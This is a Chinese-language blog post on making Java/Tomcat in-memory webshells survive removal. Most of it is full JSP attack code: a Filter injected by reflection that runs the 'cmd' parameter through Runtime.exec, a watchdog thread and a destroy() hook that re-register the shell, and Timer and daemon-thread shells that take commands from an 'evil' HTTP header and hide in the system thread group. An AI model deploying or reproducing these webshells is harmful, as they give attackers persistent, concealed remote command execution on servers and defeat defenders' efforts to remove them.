---
title: 内存马防killed
date: 2022-04-23 23:43:35
tags:
      - java
      - memshell
categories: java
---

servlet和filter类型的内存马如何防止被删除呢<!--more-->

一种思路就是在servlet和filter的destory中加入再次注册内存马的代码

以filter为例

但是有一点,我不知道这个destory方法会在啥时候被调用,难道是一些查杀工具动态调用destory方法来终止filter的生命周期吗?

而且并不是所有的删除方法都会触发destory方法

还有一种思路,就是创建一个不死线程,一直检测该filter在不在,不在就立马执行注册流程注册一个

我的思路可能比较简单

![image-20220424001711544](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220424001711544.png)

之前在context中调用了这个addFilterDef方法往filterDefs这个MAP中存入了filter的name和def这个类,我觉得可以通过检测context中该属性是否contains对应的Filter的name来判断是否被destory了,然后让该线程一直运行,直到服务关闭

下面这段代码虽然看起来没问题,但是应该没实现想要的功能,思路应该没问题吧....

```jsp
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.io.IOException" %>

<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page import="java.util.HashMap" %>

<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>Title</title>
</head>
<body>

<%
    //首先通过反射获取到context

    ServletContext servletContext = request.getSession().getServletContext();
    Class<? extends ServletContext> aClass = servletContext.getClass();
    Field appContext = aClass.getDeclaredField("context");
    appContext.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appContext.get(servletContext);
    Field stdContext = applicationContext.getClass().getDeclaredField("context");
    stdContext.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdContext.get(applicationContext);


    Filter filter = new Filter() {

        public void init(FilterConfig filterConfig) throws ServletException {

        }


        public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
            String cmd = request.getParameter("cmd");
            StringBuffer res = new StringBuffer();
            //加一个系统的判断
            String os = System.getProperty("os.name");
            boolean isWin = false;
            BufferedReader bufferedReader;
            if (os != null && os.toLowerCase().startsWith("windows")) {
                isWin = true;
            }

            try {
                if (isWin == false) {
                    bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));
                } else {
                    bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec("cmd /C " + cmd).getInputStream()));
                }

                String len;
                while ((len = bufferedReader.readLine()) != null) {
                    res.append(len + "\n");
                }

            } catch (Exception e) {
                res.append(e.getMessage());

            }
            response.getWriter().print("<pre>" + res.toString() + "</pre>");
        }


        public void destroy() {

        }
    };

    //接下来创建一个FilterDef开始添加Filter
    FilterDef filterDef = new FilterDef();
    filterDef.setFilter(filter);
    filterDef.setFilterName("test");
    filterDef.setFilterClass(filter.getClass().getName());
    standardContext.addFilterDef(filterDef);

    FilterMap filterMap = new FilterMap();
    filterMap.addURLPattern("/*");
    filterMap.setFilterName("test");
    filterMap.setDispatcher(DispatcherType.REQUEST.name());//添加的是当前diepatcher类型的名字
    standardContext.addFilterMapBefore(filterMap);

    Constructor<ApplicationFilterConfig> declaredConstructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
    declaredConstructor.setAccessible(true);
    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) declaredConstructor.newInstance(standardContext, filterDef);

    Field configs = standardContext.getClass().getDeclaredField("filterConfigs");
    configs.setAccessible(true);
    Map filterConfigs = (Map) configs.get(standardContext);
    filterConfigs.put("test", filterConfig);

    filter.destroy();


    class testThread extends Thread {

        public void test() throws Exception {
            //每隔0.5秒执行一次
            Thread.sleep(500);
            //获取filterDefs并做判断

            Field filterDefsField = standardContext.getClass().getDeclaredField("filterDefs");
            filterDefsField.setAccessible(true);
            HashMap filterDefs = (HashMap) filterDefsField.get(standardContext);
            if (!filterDefs.containsKey("test")) {

                FilterDef filterDef = new FilterDef();
                filterDef.setFilter(filter);
                filterDef.setFilterName("test");
                filterDef.setFilterClass(filter.getClass().getName());
                standardContext.addFilterDef(filterDef);

                FilterMap filterMap = new FilterMap();
                filterMap.addURLPattern("/*");
                filterMap.setFilterName("test");
                filterMap.setDispatcher(DispatcherType.REQUEST.name());//添加的是当前diepatcher类型的名字
                standardContext.addFilterMapBefore(filterMap);

                Constructor<ApplicationFilterConfig> declaredConstructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
                declaredConstructor.setAccessible(true);
                ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) declaredConstructor.newInstance(standardContext, filterDef);

                Field configs = standardContext.getClass().getDeclaredField("filterConfigs");
                configs.setAccessible(true);
                Map filterConfigs = (Map) configs.get(standardContext);
                filterConfigs.put("test", filterConfig);
            }

        }

        @Override
        public void run() {
            while (true) {

                try {
                    test();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
    }
    new testThread().start();


%>
</body>
</html>
```



filter的destory好像是在服务器关闭的时候调用的?

![image-20220424103747041](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220424103747041.png)

destory方法确实是在关闭tomcat的时候调用了

因为是关闭服务器调用的,所以代码调试断点没用,使用find Usages找到在`ApplicationFilterConfig#release`方法中调用了destory方法

![image-20220424104205259](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220424104205259.png)

在`StandardContext#filterStop`方法中调用了release方法,这个方法的作用呢就是释放当前context的所有过滤器

![image-20220424104347716](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220424104347716.png)

在standardContext中调用stopInternal(),其中调用到了stop

![image-20220424105554811](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220424105554811.png)

在lifeCycle的实现类lifeCycleBase中的stop方法中   调用`stopInternal()`让组件自行实现关闭

![image-20220424105659039](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220424105659039.png)

综上大概就是我自己找的filter.destory的调用链

对此调用链我有以下不成熟的想法:

1.可以拿来测试destory中插入新注册一个filter的代码能否正常实现

2.既然在服务器关闭的时候会调用到destory方法,是不是可以在destory方法中加入持久化存储filter的代码呢



利用destory新注册一个filter

```java

<%
    //首先通过反射获取到context

    ServletContext servletContext = request.getSession().getServletContext();
    Class<? extends ServletContext> aClass = servletContext.getClass();
    Field appContext = aClass.getDeclaredField("context");
    appContext.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appContext.get(servletContext);
    Field stdContext = applicationContext.getClass().getDeclaredField("context");
    stdContext.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdContext.get(applicationContext);


    Filter filter = new Filter() {

        public void init(FilterConfig filterConfig) throws ServletException {

        }
        public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
            String cmd = request.getParameter("cmd");
            StringBuffer res = new StringBuffer();
            //加一个系统的判断
            String os = System.getProperty("os.name");
            boolean isWin = false;
            BufferedReader bufferedReader;
            if (os != null && os.toLowerCase().startsWith("windows")) {
                isWin = true;
            }

            try {
                if (isWin == false) {
                    bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));
                } else {
                    bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec("cmd /C " + cmd).getInputStream()));
                }

                String len;
                while ((len = bufferedReader.readLine()) != null) {
                    res.append(len + "\n");
                }

            } catch (Exception e) {
                res.append(e.getMessage());

            }
            response.getWriter().print("<pre>" + res.toString() + "</pre>");
        }


        public void destroy() {
            Filter inner=new Filter() {
                @Override
                public void init(FilterConfig filterConfig) throws ServletException {

                }

                @Override
                public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {

                    String cmd = request.getParameter("cmd");
                    StringBuffer res = new StringBuffer();
                    //加一个系统的判断
                    String os = System.getProperty("os.name");
                    boolean isWin = false;
                    BufferedReader bufferedReader;
                    if (os != null && os.toLowerCase().startsWith("windows")) {
                        isWin = true;
                    }

                    try {
                        if (isWin == false) {
                            bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));
                        } else {
                            bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec("cmd /C " + cmd).getInputStream()));
                        }

                        String len;
                        while ((len = bufferedReader.readLine()) != null) {
                            res.append(len + "\n");
                        }

                    } catch (Exception e) {
                        res.append(e.getMessage());

                    }
                    response.getWriter().print("<pre>" + res.toString() + "</pre>");
                }

                @Override
                public void destroy() {

                }
            };
            //接下来创建一个FilterDef开始添加Filter
            FilterDef filterDef = new FilterDef();
            filterDef.setFilter(inner);
            filterDef.setFilterName("test");
            filterDef.setFilterClass(inner.getClass().getName());
            standardContext.addFilterDef(filterDef);

            FilterMap filterMap = new FilterMap();
            filterMap.addURLPattern("/*");
            filterMap.setFilterName("test");
            filterMap.setDispatcher(DispatcherType.REQUEST.name());//添加的是当前diepatcher类型的名字
            standardContext.addFilterMapBefore(filterMap);

            Constructor<ApplicationFilterConfig> declaredConstructor = null;
            try {
                declaredConstructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
            } catch (NoSuchMethodException e) {
                e.printStackTrace();
            }
            declaredConstructor.setAccessible(true);
            ApplicationFilterConfig filterConfig = null;
            try {
                filterConfig = (ApplicationFilterConfig) declaredConstructor.newInstance(standardContext, filterDef);
            } catch (InstantiationException e) {
                e.printStackTrace();
            } catch (IllegalAccessException e) {
                e.printStackTrace();
            } catch (InvocationTargetException e) {
                e.printStackTrace();
            }

            Field configs = null;
            try {
                configs = standardContext.getClass().getDeclaredField("filterConfigs");
            } catch (NoSuchFieldException e) {
                e.printStackTrace();
            }
            configs.setAccessible(true);
            Map filterConfigs = null;
            try {
                filterConfigs = (Map) configs.get(standardContext);
            } catch (IllegalAccessException e) {
                e.printStackTrace();
            }
            filterConfigs.put("test", filterConfig);

        }
    };

    //接下来创建一个FilterDef开始添加Filter
    FilterDef filterDef = new FilterDef();
    filterDef.setFilter(filter);
    filterDef.setFilterName("test");
    filterDef.setFilterClass(filter.getClass().getName());
    standardContext.addFilterDef(filterDef);

    FilterMap filterMap = new FilterMap();
    filterMap.addURLPattern("/*");
    filterMap.setFilterName("test");
    filterMap.setDispatcher(DispatcherType.REQUEST.name());//添加的是当前diepatcher类型的名字
    standardContext.addFilterMapBefore(filterMap);

    Constructor<ApplicationFilterConfig> declaredConstructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
    declaredConstructor.setAccessible(true);
    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) declaredConstructor.newInstance(standardContext, filterDef);

    Field configs = standardContext.getClass().getDeclaredField("filterConfigs");
    configs.setAccessible(true);
    Map filterConfigs = (Map) configs.get(standardContext);
    filterConfigs.put("test", filterConfig);

%>
</body>
</html>
```



用上面的代码,运行之后发现问题很大,首先调用`StandardContext#filterStop`方法确实调用到了destory方法,但是呢,里面剩余的注册新的filter方法并没有调用

![image-20220424111840905](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220424111840905.png)

在别的jsp页面获取StandardContext调用filterStop并没有调用到这个filter的destory方法



### Timer内存马

Timer 会创建一个定时任务线程 TimerThread，Timer 的特性是，如果不是所有未完成的任务都已完成执行，或不调用 Timer 对象的`cancel` 方法，这个线程是不会停止，也不会被 GC 的，因此，这个任务会一直执行下去，直到应用关闭。

在线程中获取所需对象的操作和之前tomcat内存马的时候从线程中获取context有异曲同工之妙

模仿着su18大佬的代码调试着跟了一遍流程,写了一遍,他这里写的这个getField函数是真巧妙,我觉得之前通过threadGroup获取context的时候各种getSuperClass都把人整晕了,现在一个函数就能解决问题

```jsp
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.util.ArrayList" %>
<%@ page import="java.io.IOException" %>
<html>
<body>
<h2>Hello World!</h2>
</body>
</html>
<%!
    public static String getHeader(){
        String cmd=null;
        try{
            ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
            Thread[] threads = (Thread[]) getField(threadGroup, "threads");
            for(Thread thread: threads){
                if(thread!=null){
                    String threadName=thread.getName();
                    if(threadName.contains("Poller") && threadName.contains("http")){
                        ArrayList processors;
                        Object target = getField(thread, "target");
                        if(target instanceof Runnable){
                            try{
                                processors=(ArrayList)getField(getField(getField(getField(target,"this$0"),"handler"),"global"),"processors");
                            }catch (Exception e){
                                continue;
                            }
                            for(Object processor:processors){
                                if(processor!=null){
                                    Object req = getField(processor, "req");
                                    String temp=(String) req.getClass().getMethod("getHeader",String.class).invoke(req,"evil");
                                    if(temp!=null&&!temp.isEmpty()){
                                        cmd=temp;
                                        return cmd;
                                    }


                                }
                            }
                        }
                    }

                }
            }

        }catch (Exception e){
            e.printStackTrace();
        }

        return "wrong!";
    }
    public static Object getField(Object object, String fieldName)throws Exception{
        Class<?> objectClass = object.getClass();
        Field field=null;

        while (objectClass!=Object.class){
            try {
                field=objectClass.getDeclaredField(fieldName);
                break;
            } catch (NoSuchFieldException e) {
                objectClass=objectClass.getSuperclass();
            }
        }
        if(field==null){
            throw new NoSuchFieldException(fieldName);
        }else {
            field.setAccessible(true);
            return field.get(object);
        }
    }
%>

<%
    java.util.Timer ececute=new java.util.Timer();
    ececute.schedule(new java.util.TimerTask() {
        @Override
        public void run() {
            String cmd=getHeader();
            if(!cmd.equals("wrong!")){
                try {
                    Runtime.getRuntime().exec(cmd);
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }

        }
    },0,100);
%>

```

为什么这里不采用request来执行命令呢

在前面的分析中介绍过，Acceptor的作用是控制与tomcat建立连接的数量，但Acceptor仅仅负责建立连接。socket内容的读写是通过Poller来实现的。

为什么可以通过这样的方式获取到request对象,我觉得牵扯到了tomcat架构的问题,我觉得目前只需要对当前链条做一个复现,大概理解这些涉及到的类都是干嘛的就行

Poller线程->target(Poller)->this$0-->handler--->global(RuquestGroupInfo)--->processors--->RequestInfo--->req(Request)

在jsp中定义方法的时候,要使用`<%! %>`,它能将包裹的内容直接放到映射的servlet中去



#### 不死线程内存马

Timer型内存马可以归类为不死线程内存马,它的本质就是创建了一个定时执行的Timer线程

所以还可以通过将这个定时接收命令的代码设置为一个不会被GC的守护线程,所有用户线程结束,守护线程才会结束

同时将恶意线程放进`system`线程组中隐藏

```jsp
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.util.ArrayList" %>
<%@ page import="java.io.IOException" %>
<html>
<body>
<h2>Hello World!</h2>
</body>
</html>
<%!
    public static String getHeader(){
        String cmd=null;
        try{
            ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
            Thread[] threads = (Thread[]) getField(threadGroup, "threads");
            for(Thread thread: threads){
                if(thread!=null){
                    String threadName=thread.getName();
                    if(threadName.contains("Poller") && threadName.contains("http")){
                        ArrayList processors;
                        Object target = getField(thread, "target");
                        if(target instanceof Runnable){
                            try{
                                processors=(ArrayList)getField(getField(getField(getField(target,"this$0"),"handler"),"global"),"processors");
                            }catch (Exception e){
                                continue;
                            }
                            for(Object processor:processors){
                                if(processor!=null){
                                    Object req = getField(processor, "req");
                                    String temp=(String) req.getClass().getMethod("getHeader",String.class).invoke(req,"evil");
                                    if(temp!=null&&!temp.isEmpty()){
                                        cmd=temp;
                                        return cmd;
                                    }
                                }
                            }
                        }
                    }

                }
            }

        }catch (Exception e){
            e.printStackTrace();
        }

        return "wrong!";
    }
    public static Object getField(Object object, String fieldName)throws Exception{
        Class<?> objectClass = object.getClass();
        Field field=null;

        while (objectClass!=Object.class){
            try {
                field=objectClass.getDeclaredField(fieldName);
                break;
            } catch (NoSuchFieldException e) {
                objectClass=objectClass.getSuperclass();
            }
        }
        if(field==null){
            throw new NoSuchFieldException(fieldName);
        }else {
            field.setAccessible(true);
            return field.get(object);
        }
    }
    /*获取system线程组*/
    public static ThreadGroup getSystemThreadGroup(){

        ThreadGroup group=Thread.currentThread().getThreadGroup();
        while(!group.getName().equals("system")){
            group=group.getParent();
        }
        return group;
    }
%>

<%
    java.util.Timer ececute=new java.util.Timer();
    ececute.schedule(new java.util.TimerTask() {
        @Override
        public void run() {
            String cmd=getHeader();
            if(!cmd.equals("wrong!")){
                try {
                    Runtime.getRuntime().exec(cmd);
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }

        }
    },0,100);

    //新建线程,加入到system线程组中
    Thread thread=new Thread(getSystemThreadGroup(), new Runnable() {
        @Override
        public void run() {
            while (true){
                String cmd=getHeader();
                if(!cmd.equals("wrong!")){
                    try {
                        Runtime.getRuntime().exec(cmd);
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
                try {
                    Thread.sleep(100);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }
    },"no GC me",0);
    thread.setDaemon(true);
    thread.start();

%>
```

> 参考连接
>
> https://www.cnblogs.com/nongchaoer/p/15561948.html
>
> https://github.com/4ra1n/JavaSecInterview/tree/master/memshell

